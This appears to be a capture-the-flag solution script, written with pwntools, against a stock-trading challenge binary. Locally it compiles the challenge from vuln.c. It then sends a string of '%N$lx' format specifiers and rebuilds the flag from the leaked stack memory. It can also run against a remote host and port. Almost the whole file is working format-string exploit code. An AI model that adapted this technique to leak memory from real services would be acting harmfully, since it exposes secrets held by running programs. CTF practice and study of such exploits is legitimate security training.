#!/usr/bin/env python3

import os
import subprocess
import sys
import tempfile
from typing import Union
from pwn import *


def usage(err=None):
    if err is not None:
        print(f"error: {err}")
    print(
        "usage: one of\n"
        "  solve.py local <path to vuln.c> <path to flag file>"
        "  solve.py remote <host:str> <port:int>\n"
    )
    sys.exit(0 if err is None else -1)


def setup():
    if len(sys.argv) != 4:
        usage("not enough arguments")
    if sys.argv[1] == 'local':
        local = True
        platform_data = (12, 8)
        vuln_c, flag_file = sys.argv[2:]
        if not os.path.isfile(vuln_c):
            usage("vuln.c path doesn't exist")
        if not os.path.isfile(flag_file):
            usage("flag file path doesn't exist")
    elif sys.argv[1] == 'remote':
        local = False
        platform_data = (15, 4)
        host, port = sys.argv[2:]
        try:
            port = int(port)
        except ValueError:
            usage("port must be an int")
    else:
        usage(f"unknown connection type: {sys.argv[1]}")

    if local:
        with open(flag_file, 'rb') as f:
            flag = f.read()
        with tempfile.TemporaryDirectory() as dir:
            exe = os.path.join(dir, 'exe')
            with open(os.path.join(dir, 'api'), 'wb') as f:
                f.write(flag)

            compiling = log.progress(f'Compiling {vuln_c}')
            subprocess.run(
                ['cc', vuln_c, '-o', exe],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL)
            compiling.success(f'Done ({exe})')

            solve(process([exe], cwd=dir), platform_data, expected=flag)
    else:
        solve(remote(host, port), platform_data)


def solve(cxn: Union[process, remote], platform_data, expected=None):
    # flag is max 128-1 bytes long
    # - #define FLAG_BUFFER 128 -> fgets(..., FLAG_BUFFER)
    # - fgets always puts in a null terminator
    # %lx prints 8 bytes per format specifier so divide by 8 sometimes
    MAX_FLAG = 127
    LX_OFFSET, BYTES_PER_LX = platform_data

    if expected is not None:
        expected = expected[:MAX_FLAG]
        log.info(f"Solving; expecting flag: {expected!r}")
    else:
        log.info("Solving")

    cxn.recvrepeat(0.1)
    cxn.send(b'1')  # buy stocks for us
    cxn.recvrepeat(0.1)

    lx_count = (MAX_FLAG//BYTES_PER_LX)+1
    fmt = '.'.join(f'%{i}$lx' for i in range(LX_OFFSET, LX_OFFSET+lx_count))
    cxn.send(fmt.encode('utf-8') + b'\n')

    cxn.recvuntil(b'token:\n')

    resp = cxn.recvline(keepends=False)
    log.info(f"Received stack data: {resp!r}")
    chunks = resp.split(b'.')
    nums = (int(c, 16) for c in chunks)
    byteses = (i.to_bytes(BYTES_PER_LX, 'little') for i in nums)
    flag_bytes = b''.join(byteses)[:MAX_FLAG]
    if b'\x00' in flag_bytes:
        # should always be there but let's be safe just in case
        # trim the string at the null terminus
        flag_bytes = flag_bytes[:flag_bytes.index(b'\x00')]

    if expected is not None:
        if flag_bytes == expected:
            log.info("Got expected flag!")
        elif flag_bytes in expected:
            log.failure(f"Partial flag: {flag_bytes!r}")
        else:
            log.failure(f"Mismatched flag: {flag_bytes!r}")
    else:
        log.info(f"Got flag: {flag_bytes}")


if __name__ == '__main__':
    setup()
